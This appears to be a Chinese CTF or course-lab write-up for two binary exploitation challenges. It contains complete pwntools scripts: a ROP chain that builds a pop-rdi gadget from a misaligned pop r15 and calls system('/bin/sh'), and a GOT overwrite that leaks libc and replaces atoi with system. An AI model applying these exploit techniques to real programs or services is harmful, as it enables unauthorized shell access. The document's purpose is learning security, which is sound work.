# Week 12

## Believe in the ROP
debug会给栈地址，rop就行了。  
课上没讲过的是64位程序的`libc_csu_init`有一个`pop r15; ret`的gadget（其实是一个巨大的万能gadget）  
而`pop r15`对应字节`41 5F`，往后一个byte就成了`pop rdi`，就可以给system传参了。  

另外一点是这里栈不是16字节对齐的，所以system_addr用了程序中已有的`call system@plt`片段补8字节进去实现栈平衡。   
如果溢出长度再长8字节的话，也可以通过插入一个`ret`来平衡。

```python
from pwn import *
elf = ELF('e:\\desk\\chall1')
p = remote("xxxx", 28160)
context.log_level = 'debug'
pop_rdi = 0x401453
return_addr = pop_rdi + 1
system_addr = 0x4011e5


addr = p.recvuntil(b'  <- saved rbp')[-(12+14):-14].decode()
binsh_addr = int(addr, 16) - 0x20

p.sendline(b"/bin/sh\x00".ljust(0x10, b"\x00") + b"b" * 8+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr))

p.interactive()
```

## List

从got表入手，拿到函数动态地址之后根据低12bit查找glibc版本，为什么能这样做在lab报告中有详细的描述。

有了libc版本（但是没附件）不太好打OG，正巧这里有个atoi，把它的got改成libc里system的地址，这样atoi的参数就变成了system的参数。

```python
from pwn import *
from LibcSearcher import *

elf = ELF('chall2')
p = elf.process() # remote("xxxx", 28160)
context.log_level = 'debug'
pop_rdi = 0x401703
atoi_got = elf.got['atoi']

p.sendlineafter(b">", b"1")
p.sendlineafter(b":", b"x")
p.sendlineafter(b">", b"1")
p.sendlineafter(b":", b"x")

p.sendlineafter(b">", b"2")
p.sendlineafter(b":", b"0")
p.sendlineafter(b"New content:", b"\x00"*40 + p64(atoi_got - 8) + b'\x00' * 8)

p.sendlineafter(b">", b"2")
p.sendlineafter(b":", b"2")

addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

obj = LibcSearcher('atoi', addr)
print(hex(obj.dump('atoi')))
libc_base = addr - obj.dump('atoi')
print(hex(obj.dump("system")))
system_addr = obj.dump("system") + libc_base
print(hex(system_addr))

p.sendlineafter(b"New content:", p64(system_addr))
p.sendlineafter(b">", b"/bin/sh")

p.interactive()
```